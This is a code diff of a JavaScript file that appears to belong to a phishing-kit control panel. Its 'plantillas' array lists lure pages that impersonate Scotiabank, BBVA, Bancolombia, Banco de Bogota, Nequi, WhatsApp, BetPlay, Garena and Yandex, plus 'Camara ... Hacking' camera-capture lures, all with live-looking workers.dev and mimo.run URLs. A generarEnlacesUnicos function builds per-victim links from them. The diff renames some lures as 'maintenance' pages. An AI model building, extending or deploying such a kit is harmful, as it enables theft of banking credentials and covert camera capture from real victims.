@@ -297,15 +297,15 @@ const plantillas = [
   { nombre: "Escotia Bank", url: "https://scotiabank.glegogle5341-af7.workers.dev/" },
   { nombre: "whatsapp Normal", url: "https://whatsappbass.glegogle5341-af7.workers.dev/" },
   { nombre: "whatsapp XxX Avance", url: "https://whatsappgrupo.glegogle5341-af7.workers.dev/" },
-  { nombre: "Nequi Login Encuesta", url: "https://nequi-login.glegogle5341-af7.workers.dev/" },
-  { nombre: "BBVA", url: "https://2gb4lr.mimo.run/index.html" },
+  { nombre: "Nequi Login Encuesta", url: "https://nequilogin.glegogle5341-af7.workers.dev/" },
+  { nombre: "BBVA Mantenimiento", url: "https://2gb4lr.mimo.run/index.html" },
   { nombre: "BetPlay", url: "https://betplay.glegogle5341-af7.workers.dev/" },
   { nombre: "Banco de Bogota", url: "https://bogota.glegogle5341-af7.workers.dev/" },
   { nombre: "Bancolombia", url: "https://bancolombia.glegogle5341-af7.workers.dev/?uid=uid_1771535158464_7gnn5tpq88q" },
   { nombre: "Camara Zoom Clases Hacking", url: "https://camaraz00m.glegogle5341-af7.workers.dev/" },
   { nombre: "Camara xXx Hacking", url: "https://camaraxx.glegogle5341-af7.workers.dev/" },
   { nombre: "Yandex", url: "https://yandex.glegogle5341-af7.workers.dev/" },  
-  { nombre: "Garena Tarjeta", url: "https://5mpser.mimo.run/index.html" }
+  { nombre: "Garena Mantenimiento", url: "https://5mpser.mimo.run/index.html" }
 ];
 function generarEnlacesUnicos() {
   const fake = $id("fakeSelect");
@@ -1155,6 +1155,7 @@ document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatM
     actualizarUsuarios();
   }, 2000);
 })();
+
 
 
 
